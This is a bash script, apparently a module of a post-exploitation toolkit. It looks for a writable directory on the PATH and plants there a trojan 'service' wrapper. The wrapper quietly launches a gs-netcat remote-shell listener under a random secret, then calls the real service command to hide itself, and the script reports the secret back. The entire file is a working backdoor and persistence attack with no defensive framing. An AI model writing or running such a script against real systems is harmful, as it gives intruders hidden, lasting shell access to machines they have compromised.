#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="path"
info "Checking writable PATH..."
IFS=':' read -ra DIRS <<< "$PATH"
for dir in "${DIRS[@]}"; do
    [ -w "$dir" ] && [ "$dir" != "." ] && {
        secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
        cat > "$dir/service" << SVCEOF
#!/bin/bash
nohup gs-netcat -s $secret -l -i &>/dev/null &
/usr/sbin/service "\$@"
SVCEOF
        chmod +x "$dir/service" 2>/dev/null
        result_json "$METHOD" "success" "$dir hijacked" "$secret"; exit 0
    }
done
result_json "$METHOD" "fail" "No writable PATH"; exit 1
